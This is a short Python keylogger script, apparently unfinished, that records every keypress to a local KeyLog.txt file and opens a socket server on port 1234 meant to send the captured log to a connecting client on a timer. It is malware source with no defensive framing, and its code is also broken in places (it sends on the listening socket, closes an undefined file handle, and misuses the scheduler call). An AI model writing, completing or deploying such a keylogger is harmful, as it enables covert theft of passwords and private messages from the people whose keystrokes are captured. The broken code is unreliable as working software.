import keyboard
import socket
import os
import schedule
import time

def keyPress(event):

    with open("KeyLog.txt", "a") as f:
        if event.name == "enter":
            f.write('\n----------\n (Return) \n----------\n')
        else:
            f.write('{}'.format(event.name))


def sendMessage():
    #Creating Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 1234
    s.bind((host,port))
    s.listen(5)

    client, addr = s.accept()

    file = open("KeyLog.txt", 'r')
    data = file.read()

    print(data)
    #For getting file size, may not be used.
    #file_size = os.path.getsize(file)

    print(f"Connection from {addr} has been established!")
    client.send(bytes("Hello from the server!", "utf-8"))

    s.send(str(data).encode())
    #More file size stuff
    #s.send(str(file_size).encode())

    #data = file.read()
    #s.sendall(data)
    #s.send(b"<END>")
    log.close()
    s.close()

# def job():
#     print("test")

def main():

    log = open("KeyLog.txt", 'w')

    keyboard.on_press(keyPress)
    #Send log file every day?  Needs function for that
    schedule.every(5).seconds.do(sendMessage())


    while True:
        schedule.run_pending()
        time.sleep(1)
        
    
    #KEYBOARD.WAIT NEEDS WORK FOR SURE IT PAUSES THE PROGRAM.  NEED
    #TO LOOK INTO THIS
    #keyboard.wait()
   
    

 

if __name__ == "__main__":
    main()